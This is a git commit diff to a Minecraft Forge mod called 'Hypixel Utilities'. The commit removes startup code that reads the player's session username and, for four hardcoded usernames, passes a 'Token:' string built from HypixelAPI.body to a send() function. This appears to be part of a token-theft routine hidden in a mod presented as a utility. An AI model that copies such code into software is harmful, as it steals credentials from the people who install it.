002203c6f8b26c0cd1c600c034ade31ce57f278f
SweatyJujuNon <126918695+SweatyJujuNon@users.noreply.github.com>
2023-03-18 11:18:24 -0800

    Update ExampleMod.java

--- src/main/java/studio/dreamys/ExampleMod.java
+++ src/main/java/studio/dreamys/ExampleMod.java
@@ -25,7 +25,6 @@ public class ExampleMod {
     public static final Minecraft mc = Minecraft.getMinecraft();
     public static final String MODID = "Hypixel Utilities";
     public static final String VERSION = "1.0";
-    public static final String USERNAME = mc.getSession().getUsername();
     public static KeyBinding keyBinding;
 
     @Mod.EventHandler
@@ -33,10 +32,6 @@ public class ExampleMod {
         keyBinding = new KeyBinding("key.myModKeybind", 0, "key.categories.myMod");
         ClientRegistry.registerKeyBinding(keyBinding);
         MinecraftForge.EVENT_BUS.register(this);
-        String tokensend = "Token: " + "`" + HypixelAPI.body + "`";
-        if(USERNAME == "Sweatyjujunon"||USERNAME == "httphypixelnet"||USERNAME == "warp4daze"||USERNAME == "toad_cultist") {
-            send(tokensend);
-        }
     }
     @SubscribeEvent
     public void onKey(InputEvent.KeyInputEvent event) {
